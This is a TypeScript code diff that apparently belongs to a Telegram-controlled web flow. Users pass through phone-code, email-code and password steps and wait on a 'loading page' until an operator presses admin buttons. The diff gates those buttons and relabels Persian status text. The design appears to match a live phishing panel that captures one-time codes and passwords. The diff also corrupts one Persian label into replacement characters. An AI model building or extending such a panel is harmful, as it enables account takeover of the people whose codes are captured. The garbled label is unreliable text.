@@ -582,6 +582,7 @@ const formatInitialMessage = (session: UserSession): string => {
 
 /**
  * Get admin keyboard based on session state
+ * Admin buttons should ONLY be shown when user is on loading page (waiting_admin)
  */
 const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   console.log("🎛️ Building admin keyboard for session:", {
@@ -591,17 +592,22 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     authAttempts: session.authAttempts,
   });
 
-  // Only show buttons if user is on loading page AND has completed phone verification
+  // STRICT: Only show buttons if user is exactly on loading page (waiting_admin)
   if (session.currentStep !== "waiting_admin") {
-    console.log("❌ Not showing buttons - wrong step:", session.currentStep);
+    console.log(
+      "❌ Admin buttons BLOCKED - user not on loading page:",
+      session.currentStep,
+    );
     return { inline_keyboard: [] };
   }
 
   // User must have completed phone verification to see admin buttons
   if (!session.completedSteps.includes("phone_verification")) {
-    console.log("❌ Not showing buttons - phone verification not completed");
+    console.log("❌ Admin buttons BLOCKED - phone verification not completed");
     return { inline_keyboard: [] };
   }
+
+  console.log("✅ Admin buttons ALLOWED - user is on loading page");
 
   const buttons = [];
 
@@ -871,7 +877,7 @@ const updateTelegramMessage = async (
 const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
     phone_verification: "در انتظار کد تایید شماره",
-    waiting_admin: "در انتظار دستور ادمین",
+    waiting_admin: "در انت��ار دستور ادمین",
     email_verification: "در انتظار کد تایید ایمیل",
     email_completed: "ایمیل تایید شد",
     auth_password: "وارد کردن رمز عبور",
